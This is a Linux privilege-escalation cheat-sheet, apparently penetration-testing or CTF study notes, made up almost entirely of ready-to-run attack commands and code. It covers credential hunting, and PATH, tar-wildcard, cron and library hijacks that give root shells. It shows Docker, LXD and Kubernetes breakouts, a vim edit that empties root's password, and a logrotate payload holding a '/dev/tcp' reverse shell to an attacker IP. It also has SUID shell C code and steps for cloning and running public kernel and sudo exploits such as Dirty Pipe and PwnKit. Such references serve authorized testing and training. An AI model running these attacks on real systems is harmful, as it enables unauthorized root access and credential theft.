# Linux Privilege Escalation Cheat-Sheet


## 1. Information Gathering

### Basic Enumeration
```bash
# System Information
cat /etc/os-release
uname -a
cat /proc/version
hostname
whoami && id

# Quick Wins Check
sudo -l
```

### Environment & Network
```bash
# Environment Variables
echo $PATH
env

# Network Information
ifconfig || ip a
route || netstat -rn
netstat -ano
arp -a

# File Systems
lsblk
lpstat
cat /etc/fstab
df -h
```

### Users & Groups
```bash
# Users with shell access
cat /etc/passwd
grep "sh$" /etc/passwd
ls /home

# Groups
cat /etc/group
getent group sudo
```

### Hidden Files & Directories
```bash
# Hidden files
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <user>

# Hidden directories
find / -type d -name ".*" -ls 2>/dev/null

# Temporary files
ls -l /tmp /var/tmp /dev/shm
```

### Services & Processes
```bash
# Command history
history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

# Running processes by root
ps aux | grep root

# Cron jobs
ls -la /etc/cron.daily/
cat /etc/crontab

# Installed packages
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

# GTFOBins check
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

### Configuration Files
```bash
# Config files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

# Scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

### Credential Hunting
```bash
# WordPress credentials
grep 'DB_USER\|DB_PASSWORD' wp-config.php

# Configuration files
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# SSH Keys
ls ~/.ssh

# Files
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
find /home/* -type f -name "*.txt" -o ! -name "*.*"
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
find / -name "*.kdbx" 2>/dev/null
find / \( -name "*.kdbx" -o -name "*.kdb" -o -iname "*keepass*" \) 2>/dev/null
find / -name "*.psafe3" 2>/dev/null
find / \( -name "*.kdbx" -o -name "*.kdb" -o -name "*.psafe3" -o -iname "*keepass*" -o -iname "*pwsafe*" -o -iname "*passwordsafe*" \) 2>/dev/null
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

# Passwords
grep -r -i "password\|pass" / 2>/dev/null
grep -r -i -n --include="*.txt" --include="*.conf" --include="*.config" --include="*.xml" --include="*.json" --include="*.yml" --include="*.yaml" --include="*.ini" --include="*.log" --include="*.bak" --include="*.backup" "password\|pass" / 2>/dev/null
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.txt" -o -name "*.xml" -o -name "*.json" -o -name "*.yml" -o -name "*.ini" -o -name "*.log" -o -name "*.bak" \) -exec grep -l -i "password\|pass" {} \; 2>/dev/null
`````
---

## 2. Environment-Based Privilege Escalation

### PATH Hijacking
```bash
# Step 1: Check current PATH
echo $PATH

# Step 2: Add current directory to PATH
PATH=.:${PATH}
export PATH

# Step 3: Create malicious binary
echo '#!/bin/bash' > ls
echo '/bin/bash' >> ls
chmod +x ls

# Step 4: Execute when victim runs 'ls'
```

### Wildcard Abuse (Tar Example)
```bash
# If cron job uses: tar -zcf backup.tar.gz *

# Step 1: Create malicious script
echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

# Step 2: Create checkpoint files
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

# Step 3: Wait for cron execution
```

### Escaping Restricted Shells
```bash
# Command substitution
ls -l `pwd`
echo *
echo $(<flag.txt)

# Using editors
man -c flag.txt
```

---

## 3. Permissions-Based Privilege Escalation

### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Find SGID binaries  
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

# Check GTFOBins for exploitation: https://gtfobins.github.io/
```

### Writable Files & Directories
```bash
# Writable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null

# Writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

### Sudo Rights Abuse
```bash
# Step 1: Check sudo permissions
sudo -l

# Step 2: Check GTFOBins for specific binary exploitation
# Example: sudo tcpdump
# https://gtfobins.github.io/gtfobins/tcpdump/
```

### Privileged Groups

#### LXD/LXC Group

**Method 1: Alpine Container**
```bash
# Step 1: Check group membership
id

# Step 2: Create privileged container
unzip alpine.zip
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh

# Step 3: Access host filesystem at /mnt/root
```

**Method 2: Direct LXD Container**
```bash
# Step 1: Check group membership
id

# Step 2: Import and setup container
lxc image import alpine-v3.18-x86_64-20230607_1234.tar.gz --alias imagetemp
lxc image list
lxc init imagetemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh

# Step 3: Access host filesystem
ls -l /mnt/root
```

#### Docker Group
```bash
# Mount host root directory
docker run -v /root:/mnt -it ubuntu

# Access mounted directory for SSH keys, etc.
```

### Capabilities
```bash
# Step 1: Find capabilities
find / -type f -exec getcap {} \; 2>/dev/null | grep -v "= $"
find / -type f -perm /u+s,g+s -exec getcap {} \; 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# Step 2: Exploit cap_dac_override (example with vim)
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
# Now root has no password
su root
```

---

## 4. Services-Based Privilege Escalation

### Vulnerable Services (Screen Example)
```bash
# Step 1: Check version
screen -v

# Step 2: If version 4.05.00, use exploit
./screen_exploit.sh
```

### Cron Job Abuse
```bash
# Step 1: Monitor with pspy
./pspy64 -pf -i 1000

# Step 2: Find writable cron script and add payload
echo '#!/bin/bash' > /path/to/script.sh
echo 'cp /bin/bash /tmp/rootbash' >> /path/to/script.sh
echo 'chmod +s /tmp/rootbash' >> /path/to/script.sh

# Step 3: Wait for execution and run
/tmp/rootbash -p
```

### Docker Privilege Escalation

#### Docker Socket
```bash
# Step 1: Check for docker socket
ls -al docker.sock

# Step 2: Create privileged container
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem <image>

# Step 3: Access container
docker -H unix:///app/docker.sock exec -it <container_id> /bin/bash
```

#### Docker Group
```bash
# Mount host filesystem
docker image ls
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it <image> chroot /mnt bash
```

### Kubernetes Exploitation
```bash
# Step 1: Extract service account token
kubeletctl -i --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

# Step 2: Extract certificates
kubeletctl --server <IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

# Step 3: Check privileges
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 auth can-i --list

# Step 4: Create privileged pod (see YAML in original content)
kubectl --token=$token --certificate-authority=ca.crt --server=https://<IP>:6443 apply -f privesc.yaml

# Step 5: Extract root SSH key
kubeletctl --server <IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

### Logrotate Exploitation
```bash
# Step 1: Check requirements
grep "create\|compress" /etc/logrotate.conf | grep -v "#"

# Step 2: Compile and run exploit
gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/<Your_IP>/<Your_Port> 0>&1' > payload
./logrotten -p ./payload /tmp/tmp.log
```

### NFS Weak Privileges
```bash
# Step 1: Check NFS exports
showmount -e <IP>
cat /etc/exports

# Step 2: Create SUID binary on attacker machine
cat shell.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

gcc shell.c -o shell

# Step 3: Mount and copy
sudo mount -t nfs <IP>:/tmp /mnt
cp shell /mnt
chmod u+s /mnt/shell

# Step 4: Execute on victim
./shell
```

### Tmux Session Hijacking
```bash
# Step 1: Look for tmux sessions
tmux list-sessions

# Step 2: Attach to privileged session
tmux -S /shareds
```

---

## 5. Linux Internals-Based Privilege Escalation

### Kernel Exploits
```bash
# Step 1: Check kernel version
uname -a
cat /etc/lsb-release

# Step 2: Use appropriate exploit based on version

# DirtyCow (CVE-2016-5195)
gcc -static -static-libgcc -static-libstdc++ dirtycow.c -o dirtycow && chmod +x dirtycow
gcc -static dirtycow.c -o dirtycow
./dirtycow

(Vulnerable version: 2.x - 4.x)

# Ubuntu OverlayFS (CVE-2021-3493)
gcc -static -static-libgcc -static-libstdc++ -o ubuntu_exploit exploit_ubuntu.c
gcc -static -o ubuntu_exploit exploit_ubuntu.c
./ubuntu_exploit

Affected Versions:
Ubuntu 20.10
Ubuntu 20.04 LTS
Ubuntu 19.04
Ubuntu 18.04 LTS
Ubuntu 16.04 LTS
Ubuntu 14.04 ESM
```

### Shared Library Hijacking

#### LD_PRELOAD
```bash
# Step 1: Check sudo with LD_PRELOAD
sudo -l | grep LD_PRELOAD

# Step 2: Create malicious library
cat root_ld_preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# Step 3: Compile and execute
gcc -fPIC -shared -o root_ld_preload.so root_ld_preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/root_ld_preload.so /usr/sbin/apache2 restart
```

#### Shared Object Hijacking
```bash
# Step 1: Check dependencies
ldd payroll

# Step 2: Check RUNPATH
readelf -d payroll | grep PATH

# Step 3: Find missing function
./payroll
# Error: undefined symbol: dbquery

# Step 4: Create malicious library
cat src.c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}

# Step 5: Compile and execute
gcc src.c -fPIC -shared -o /development/libshared.so
./payroll
```
````bash
# Automate Scanner
chmod +x scanner_library_hijacking.sh
./scanner_library_hijacking.sh
````

### Python Library Hijacking

#### Wrong Write Permissions
```bash
# Step 1: Check SUID Python script
ls -l mem_status.py

# Step 2: Find writable module
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

# Step 3: Modify function
# Add: import os; os.system('id') to virtual_memory function

# Step 4: Execute
sudo /usr/bin/python3 ./mem_status.py
```
```bash
In this case, we have write permission for the directory.

# Step 1: Checks if we have write permission in the directory where the script is located
ls -la .

# Step 2: Create a Python file with the same name as the module that the script is importing
vi or nano psutil.py
#!/usr/bin/env python3

import os
def virtual_memory():
    os.system('/bin/bash')

# Step 3: Execute
sudo /usr/bin/python3 /home/student/mem_status.py
````


#### Library Path Hijacking
```bash
# Step 1: Check Python path priority
python3 -c 'import sys; print("\n".join(sys.path))'

# Step 2: Check Default Installation Location
pip3 show <module>

# Step 3: Check writable high-priority directory
ls -la /usr/lib/python3.8

# Step 4: Create malicious module in higher priority path
echo '#!/usr/bin/env python3
import os
def virtual_memory():
    os.system("id")' > /usr/lib/python3.8/psutil.py

# Step 5: Execute
sudo /usr/bin/python3 mem_status.py
```

#### PYTHONPATH Environment Variable
```bash
# Step 1: Check sudo permissions
sudo -l | grep "SETENV"

# Step 2: Create malicious module
echo '#!/usr/bin/env python3
import os
def virtual_memory():
    os.system("id")' > /tmp/psutil.py

# Step 3: Execute with PYTHONPATH
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```

---

## 6. 0-Days & Recent Exploits

### Sudo Exploits

#### CVE-2021-3156 (Baron Samedit)
```bash
# Step 1: Check version (vulnerable: 1.8.31, 1.8.27, 1.9.2)
sudo -V | head -n1
cat /etc/lsb-release

# Step 2: Exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich <target>
```

#### CVE-2019-14287 (Sudo Policy Bypass)
```bash
# Step 1: Check sudo permissions (vulnerable: < 1.8.28)
sudo -l

# Step 2: If allowed to run commands as (ALL), exploit with negative UID
sudo -u#-1 id
```

### Polkit - CVE-2021-4034 (PwnKit)
```bash
# Step 1: Compile exploit
gcc cve-2021-4034-poc.c -o pwnkit_poc

# Step 2: Execute
./pwnkit_poc
```

### Dirty Pipe - CVE-2022-0847
```bash
# Step 1: Check kernel version (vulnerable: 5.8 - 5.17)
uname -r

# Step 2: Download and compile
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

# Step 3: Execute (Method 1 - /etc/passwd)
./dirtypipe1
if appears: system() function call seems to have failed :(
su root
# Password: piped

# Step 4: Execute (Method 2 - SUID binary)
find / -perm -4000 2>/dev/null
./dirtypipe2 /usr/bin/sudo
```

### Netfilter Exploits

#### CVE-2021-22555
```bash
# Step 1: Check kernel (vulnerable: 2.6 - 5.11)
uname -r

# Step 2: Compile and execute
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit
./exploit
```

#### CVE-2022-25636
```bash
# Step 1: Check kernel (vulnerable: 5.4-5.6.10, 5.11-5.15.26)
git clone https://github.com/Bonfee/CVE-2022-25636.git
cd CVE-2022-25636
make
./exploit
```

#### CVE-2023-32233
```bash
# Step 1: Check kernel (vulnerable: up to 6.3.1)
git clone https://github.com/Liuk3r/CVE-2023-32233
cd CVE-2023-32233
gcc -Wall -o exploit exploit.c -lmnl -lnftnl
./exploit
```

---

## Quick Automated Tools

### LinPEAS
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

### pspy (Process monitoring)
```bash
./pspy64 -pf -i 1000
```

---

## One-Liners for Quick Assessment

```bash
# Basic enumeration
(echo "=== SYSTEM INFO ==="; uname -a; echo -e "\n=== SUDO PERMS ==="; sudo -l 2>/dev/null; echo -e "\n=== SUID BINARIES ==="; find / -perm -4000 2>/dev/null | head -20; echo -e "\n=== WRITABLE DIRS ==="; find / -writable -type d 2>/dev/null | grep -v proc | head -10)

# Quick privesc check
find / -perm -4000 2>/dev/null; sudo -l; cat /etc/crontab; ps aux | grep root
```

---

## Important References

- **GTFOBins**: https://gtfobins.github.io/
